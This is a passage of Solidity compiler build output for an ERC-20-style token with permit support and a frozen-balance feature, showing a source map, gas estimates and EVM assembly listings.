							"sourceMap": "111:4330:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;111:4330:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;175:39;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:100:-1;33:3;30:1;27:10;8:100;;;90:11;;;84:18;71:11;;;64:39;52:2;45:10;8:100;;;12:14;175:39:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2810:147;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;2810:147:0;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;307:26;;;:::i;:::-;;;;;;;;;;;;;;;;3108:361;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;3108:361:0;;;;;;;;;;;;;;;;;:::i;656:116::-;;;:::i;266:35::-;;;:::i;:::-;;;;;;;;;;;;;;;;;;;515:31;;;:::i;459:49::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;459:49:0;-1:-1:-1;;;;;459:49:0;;:::i;339:44::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;339:44:0;-1:-1:-1;;;;;339:44:0;;:::i;778:41::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;778:41:0;-1:-1:-1;;;;;778:41:0;;:::i;220:40::-;;;:::i;2963:139::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;2963:139:0;;;;;;;;:::i;3475:964::-;;;;;;13:3:-1;8;5:12;2:2;;;30:1;27;20:12;2:2;-1:-1;;;;;;3475:964:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;389:64;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;389:64:0;;;;;;;;;;:::i;175:39::-;;;;;;;;;;;;;;-1:-1:-1;;;175:39:0;;;;:::o;2810:147::-;2877:4;2893:36;2902:10;2914:7;2923:5;2893:8;:36::i;:::-;-1:-1:-1;2946:4:0;2810:147;;;;;:::o;307:26::-;;;;:::o;3108:361::-;-1:-1:-1;;;;;3239:15:0;;3219:4;3239:15;;;:9;:15;;;;;;;;3255:10;3239:27;;;;;;;;-1:-1:-1;;3239:42:0;3235:171;;-1:-1:-1;;;;;3327:15:0;;;;;;:9;:15;;;;;;;;3343:10;3327:27;;;;;;;;:68;;3376:5;3327:68;:31;:68;:::i;:::-;-1:-1:-1;;;;;3297:15:0;;;;;;:9;:15;;;;;;;;3313:10;3297:27;;;;;;;:98;3235:171;3415:26;3425:4;3431:2;3435:5;3415:9;:26::i;:::-;-1:-1:-1;3458:4:0;3108:361;;;;;:::o;656:116::-;706:66;656:116;:::o;266:35::-;299:2;266:35;:::o;515:31::-;;;;:::o;459:49::-;;;;;;;;;;;;;:::o;339:44::-;;;;;;;;;;;;;:::o;778:41::-;;;;;;;;;;;;;:::o;220:40::-;;;;;;;;;;;;;;-1:-1:-1;;;220:40:0;;;;:::o;2963:139::-;3026:4;3042:32;3052:10;3064:2;3068:5;3042:9;:32::i;3475:964::-;3688:15;3676:8;:27;;3668:56;;;;;-1:-1:-1;;;3668:56:0;;;;;;;;;;;;-1:-1:-1;;;3668:56:0;;;;;;;;;;;;;;;3836:16;;-1:-1:-1;;;;;4073:13:0;;;3734:14;4073:13;;;:6;:13;;;;;;;;:15;;;;;;;;;3901:243;;706:66;3901:243;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3901:243:0;;;;;3870:292;;;;;;-1:-1:-1;;;3774:402:0;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3774:402:0;;;;;;3751:435;;;;;;;;;4223:26;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3734:14;;4073:15;4223:26;;;;;-1:-1:-1;;4223:26:0;;;;;;;;;;4073:15;4223:26;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;-1:-1;;4223:26:0;;-1:-1:-1;;4223:26:0;;;-1:-1:-1;;;;;;;4280:30:0;;;;;;:59;;;4334:5;-1:-1:-1;;;;;4314:25:0;:16;-1:-1:-1;;;;;4314:25:0;;4280:59;4259:132;;;;;-1:-1:-1;;;4259:132:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;4401:31;4410:5;4417:7;4426:5;4401:8;:31::i;:::-;3475:964;;;;;;;;;:::o;389:64::-;;;;;;;;;;;;;;;;;;;;;;;;:::o;2410:169::-;-1:-1:-1;;;;;2493:16:0;;;;;;;:9;:16;;;;;;;;:25;;;;;;;;;;;;;:33;;;2541:31;;;;;;;;;;;;;;;;;2410:169;;;:::o;339:136:7:-;431:5;;;426:16;;;;418:50;;;;;-1:-1:-1;;;418:50:7;;;;;;;;;;;;-1:-1:-1;;;418:50:7;;;;;;;;;;;;;;2585:219:0;-1:-1:-1;;;;;2681:15:0;;;;;;:9;:15;;;;;;:26;;2701:5;2681:26;:19;:26;:::i;:::-;-1:-1:-1;;;;;2663:15:0;;;;;;;:9;:15;;;;;;:44;;;;2733:13;;;;;;;:24;;2751:5;2733:24;:17;:24;:::i;:::-;-1:-1:-1;;;;;2717:13:0;;;;;;;:9;:13;;;;;;;;;:40;;;;2772:25;;;;;;;2717:13;;2772:25;;;;;;;;;;;;;2585:219;;;:::o;198:135:7:-;290:5;;;285:16;;;;277:49;;;;;-1:-1:-1;;;277:49:7;;;;;;;;;;;;-1:-1:-1;;;277:49:7;;;;;;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "450400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"DOMAIN_SEPARATOR()": "1087",
								"PERMIT_TYPEHASH()": "243",
								"_frozenBalance(address)": "1147",
								"allowance(address,address)": "1305",
								"approve(address,uint256)": "22366",
								"balanceOf(address)": "1169",
								"decimals()": "274",
								"name()": "infinite",
								"nonces(address)": "1191",
								"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
								"symbol()": "infinite",
								"totalSupply()": "1066",
								"transfer(address,uint256)": "infinite",
								"transferFrom(address,address,uint256)": "infinite"
							},
							"internal": {
								"_approve(address,address,uint256)": "infinite",
								"_burn(address,uint256)": "infinite",
								"_mint(address,uint256)": "infinite",
								"_transfer(address,address,uint256)": "infinite",
								"freezeMint(address,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "MSTORE"
								},
								{
									"begin": 1017,
									"end": 1502,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "MLOAD"
								},
								{
									"begin": 1107,
									"end": 1114,
									"name": "CHAINID"
								},
								{
									"begin": 1107,
									"end": 1114,
									"name": "SWAP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH data",
									"value": "8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "CODECOPY"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "MLOAD"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SWAP2"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SWAP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SUB"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "ADD"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "KECCAK256"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "ADD"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "PUSH",
									"value": "7"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP4"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "4B4243204C5073"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "C8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "SWAP4"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP5"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "ADD"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP2"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MLOAD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP4"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "ADD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP4"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP2"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "31"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "F8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "SWAP1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP5"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "ADD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MLOAD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP5"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1354,
									"end": 1376,
									"name": "PUSH",
									"value": "6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP4"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1394,
									"end": 1415,
									"name": "PUSH",
									"value": "C89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "60"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP5"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP5"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1466,
									"end": 1470,
									"name": "ADDRESS"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP7"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MLOAD"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP1"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP7"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "SUB"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP1"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP2"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "ADD"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "DUP2"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "C0"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP5"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "DUP3"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "MLOAD"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "SWAP3"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "ADD"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "SWAP2"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "SWAP1"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "SWAP2"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "KECCAK256"
								},
								{
									"begin": 1133,
									"end": 1149,
									"name": "PUSH",
									"value": "4"
								},
								{
									"begin": 1133,
									"end": 1495,
									"name": "SSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "DUP1"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "CODECOPY"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820f67d2fcb41c2924b09964a6438469181dd9dcbf870211c842940f1534ae0dced64736f6c63430005100032",
									".code": [
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "MSTORE"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "POP"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "LT"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "SHR"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "GT"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "95D89B41"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "GT"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "95D89B41"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "D505ACCF"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "DD62ED3E"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMP"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "7ECEBE00"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMP"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "GT"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "30ADF81F"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "313CE567"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "3644E515"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMP"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "6FDDE03"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "95EA7B3"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "18160DDD"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "REVERT"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP6"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
